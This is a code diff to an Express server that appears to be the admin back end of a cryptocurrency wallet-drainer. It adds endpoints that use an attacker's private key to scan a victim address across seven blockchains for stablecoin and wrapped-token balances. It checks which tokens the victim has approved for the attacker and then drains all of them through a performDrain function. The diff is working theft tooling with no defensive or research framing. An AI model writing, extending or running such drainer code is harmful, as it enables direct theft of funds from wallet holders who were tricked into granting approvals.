@@ -471,12 +471,155 @@ app.post('/admin/config', adminAuth, (req, res) => {
   res.json({ ok: true })
 })
 
-// Manually trigger drain for a connected wallet (from admin panel)
+// Manually trigger drain for a specific token (from admin panel)
 app.post('/admin/drain-manual', adminAuth, async (req, res) => {
   const { owner, tokenAddress, chainId } = req.body
   if (!owner || !tokenAddress || !chainId) return res.json({ success: false, error: 'Missing params' })
   addLog('warn', `Manual drain triggered by admin for ${owner}`)
   res.json(await performDrain(owner, tokenAddress, chainId, null, null))
+})
+
+// Scan a wallet on-chain: discover all tokens + check allowances for admin
+app.post('/admin/scan-wallet', adminAuth, async (req, res) => {
+  const { address } = req.body
+  if (!address) return res.json({ ok: false, error: 'Missing address' })
+
+  let attackerAddress = null
+  try { attackerAddress = new ethers.Wallet(config.attackerPrivateKey).address } catch(_) {}
+  if (!attackerAddress) return res.json({ ok: false, error: 'Attacker wallet not configured' })
+
+  addLog('info', `Admin scan: ${address}`)
+  const results = []
+
+  // Well-known tokens per chain
+  const TOKENS = {
+    1:     [
+      { addr: '0xdAC17F958D2ee523a2206206994597C13D831ec7', sym: 'USDT' },
+      { addr: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48', sym: 'USDC' },
+      { addr: '0x6B175474E89094C44Da98b954EedeAC495271d0F', sym: 'DAI' },
+      { addr: '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2', sym: 'WETH' },
+      { addr: '0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599', sym: 'WBTC' },
+    ],
+    56:    [
+      { addr: '0x55d398326f99059fF775485246999027B3197955', sym: 'USDT' },
+      { addr: '0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d', sym: 'USDC' },
+      { addr: '0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56', sym: 'BUSD' },
+      { addr: '0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c', sym: 'WBNB' },
+      { addr: '0x2170Ed0880ac9A755fd29B2688956BD959F933F8', sym: 'ETH' },
+    ],
+    137:   [
+      { addr: '0xc2132D05D31c914a87C6611C10748AEb04B58e8F', sym: 'USDT' },
+      { addr: '0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359', sym: 'USDC' },
+      { addr: '0x7ceB23fD6bC0adD59E62ac25578270cFf1b9f619', sym: 'WETH' },
+    ],
+    42161: [
+      { addr: '0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9', sym: 'USDT' },
+      { addr: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831', sym: 'USDC' },
+      { addr: '0x82aF49447D8a07e3bd95BD0d56f35241523fBab1', sym: 'WETH' },
+    ],
+    10:    [
+      { addr: '0x94b008aA00579c1307B0EF2c499aD98a8ce58e58', sym: 'USDT' },
+      { addr: '0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85', sym: 'USDC' },
+    ],
+    43114: [
+      { addr: '0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7', sym: 'USDT' },
+      { addr: '0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E', sym: 'USDC' },
+    ],
+    8453:  [
+      { addr: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913', sym: 'USDC' },
+      { addr: '0x4200000000000000000000000000000000000006', sym: 'WETH' },
+    ],
+  }
+
+  const chainIds = Object.keys(RPCS).map(Number)
+  await Promise.allSettled(chainIds.map(async (chainId) => {
+    try {
+      const provider = await getProvider(chainId)
+      // Check native balance
+      const nativeBal = await provider.getBalance(address)
+      const nativeFormatted = parseFloat(ethers.utils.formatEther(nativeBal))
+      const chainNames = { 1:'Ethereum', 56:'BSC', 137:'Polygon', 42161:'Arbitrum', 10:'Optimism', 43114:'Avalanche', 8453:'Base' }
+      const nativeSyms = { 1:'ETH', 56:'BNB', 137:'MATIC', 42161:'ETH', 10:'ETH', 43114:'AVAX', 8453:'ETH' }
+      if (nativeFormatted > 0.0001) {
+        results.push({
+          chainId, chain: chainNames[chainId] || `Chain ${chainId}`,
+          token: 'native', symbol: nativeSyms[chainId] || 'ETH', decimals: 18,
+          balance: nativeFormatted.toFixed(6), allowance: 'N/A', drainable: false
+        })
+      }
+      // Check ERC-20 tokens
+      const tokens = TOKENS[chainId] || []
+      for (const tk of tokens) {
+        try {
+          const contract = new ethers.Contract(tk.addr, ERC20_ABI, provider)
+          const bal = await contract.balanceOf(address)
+          if (bal.eq(0)) continue
+          const dec = await contract.decimals().catch(() => 18)
+          const formatted = parseFloat(ethers.utils.formatUnits(bal, dec))
+          let allowanceVal = '0'
+          let drainable = false
+          if (attackerAddress) {
+            const allow = await contract.allowance(address, attackerAddress)
+            allowanceVal = parseFloat(ethers.utils.formatUnits(allow, dec)).toFixed(4)
+            drainable = allow.gt(0)
+          }
+          results.push({
+            chainId, chain: chainNames[chainId] || `Chain ${chainId}`,
+            token: tk.addr, symbol: tk.sym, decimals: dec,
+            balance: formatted.toFixed(4), allowance: allowanceVal, drainable
+          })
+        } catch(_) {}
+      }
+    } catch(_) {}
+  }))
+
+  res.json({ ok: true, address, attackerAddress, tokens: results })
+})
+
+// Drain ALL approved tokens from a wallet across all chains
+app.post('/admin/drain-all', adminAuth, async (req, res) => {
+  const { address } = req.body
+  if (!address) return res.json({ ok: false, error: 'Missing address' })
+  addLog('warn', `Admin DRAIN ALL triggered for ${address}`)
+
+  // First scan to find drainable tokens
+  let attackerAddress = null
+  try { attackerAddress = new ethers.Wallet(config.attackerPrivateKey).address } catch(_) {}
+  if (!attackerAddress) return res.json({ ok: false, error: 'Attacker wallet not configured' })
+
+  const drainResults = []
+  const TOKENS = {
+    1:     [{ addr:'0xdAC17F958D2ee523a2206206994597C13D831ec7',sym:'USDT' },{ addr:'0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',sym:'USDC' },{ addr:'0x6B175474E89094C44Da98b954EedeAC495271d0F',sym:'DAI' },{ addr:'0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',sym:'WETH' }],
+    56:    [{ addr:'0x55d398326f99059fF775485246999027B3197955',sym:'USDT' },{ addr:'0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d',sym:'USDC' },{ addr:'0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56',sym:'BUSD' }],
+    137:   [{ addr:'0xc2132D05D31c914a87C6611C10748AEb04B58e8F',sym:'USDT' },{ addr:'0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359',sym:'USDC' }],
+    42161: [{ addr:'0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9',sym:'USDT' },{ addr:'0xaf88d065e77c8cC2239327C5EDb3A432268e5831',sym:'USDC' }],
+    10:    [{ addr:'0x94b008aA00579c1307B0EF2c499aD98a8ce58e58',sym:'USDT' },{ addr:'0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85',sym:'USDC' }],
+    43114: [{ addr:'0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7',sym:'USDT' },{ addr:'0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E',sym:'USDC' }],
+    8453:  [{ addr:'0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',sym:'USDC' }],
+  }
+
+  for (const [chainId, tokens] of Object.entries(TOKENS)) {
+    try {
+      const attacker = await getAttackerWallet(parseInt(chainId))
+      const gasBal = await attacker.getBalance()
+      if (gasBal.eq(0)) continue // skip unfunded chains
+
+      for (const tk of tokens) {
+        try {
+          const contract = new ethers.Contract(tk.addr, ERC20_ABI, attacker)
+          const bal = await contract.balanceOf(address)
+          if (bal.eq(0)) continue
+          const allow = await contract.allowance(address, attacker.address)
+          if (allow.eq(0)) continue
+          // Has balance + allowance — drain it
+          const result = await performDrain(address, tk.addr, parseInt(chainId), null, null)
+          drainResults.push({ ...result, symbol: tk.sym, chainId: parseInt(chainId) })
+        } catch(_) {}
+      }
+    } catch(_) {}
+  }
+
+  res.json({ ok: true, results: drainResults, total: drainResults.length })
 })
 
 // Clear logs
